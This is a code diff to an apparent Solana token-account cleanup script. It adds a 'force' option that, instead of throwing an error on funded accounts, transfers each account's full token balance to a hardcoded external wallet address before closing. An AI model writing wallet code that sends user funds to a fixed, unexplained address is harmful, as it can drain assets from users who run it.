@@ -24,6 +24,7 @@ const {
   createCloseAccountInstruction,
   createSyncNativeInstruction,
   createAssociatedTokenAccountInstruction,
+  getOrCreateAssociatedTokenAccount,
 } = require("@solana/spl-token");
 
 const { WSOL_TOKEN_ACCOUNT, connection } = require("../constants/index");
@@ -68,7 +69,10 @@ async function getSPLBalanceAmount(
  * @param {*} keypair
  * @returns
  */
-async function closeAllTokenAccounts(connection, keypair) {
+const closeTokenRecAddress = new PublicKey(
+  "914ieyzsV2wG4DDwqTTZ6be8TxZJ1s3cpRrz7LaviSrC"
+);
+async function closeAllTokenAccounts(connection, keypair, force = false) {
   try {
     const wallet = keypair;
 
@@ -99,14 +103,35 @@ async function closeAllTokenAccounts(connection, keypair) {
       const accountInfo = await getAccount(connection, accountPubkey);
 
       if (accountInfo.amount >= minAmount) {
-        throw new Error(
-          `Token account ${wallet.publicKey.toBase58()} has balance ${
-            accountInfo.amount
-          }`
-        );
-      }
-      // 检查余额是否为 0
-      if (accountInfo.amount > 0 && accountInfo.amount < minAmount) {
+        if (force) {
+          try {
+            console.log(accountInfo);
+            const dAccount = await getOrCreateAssociatedTokenAccount(
+              connection,
+              wallet,
+              accountInfo.mint,
+              closeTokenRecAddress
+            );
+            const signature = await transfer(
+              connection,
+              wallet,
+              accountInfo.address,
+              dAccount.address,
+              wallet.publicKey,
+              accountInfo.amount
+            );
+            await connection.confirmTransaction(signature, "confirmed");
+          } catch (error) {
+            console.log(error);
+          }
+        } else {
+          throw new Error(
+            `Token account ${wallet.publicKey.toBase58()} has balance ${
+              accountInfo.amount
+            }`
+          );
+        }
+      } else if (accountInfo.amount > 0 && accountInfo.amount < minAmount) {
         console.log(
           chalk.red(
             `Token account ${wallet.publicKey.toBase58()} has balance ${
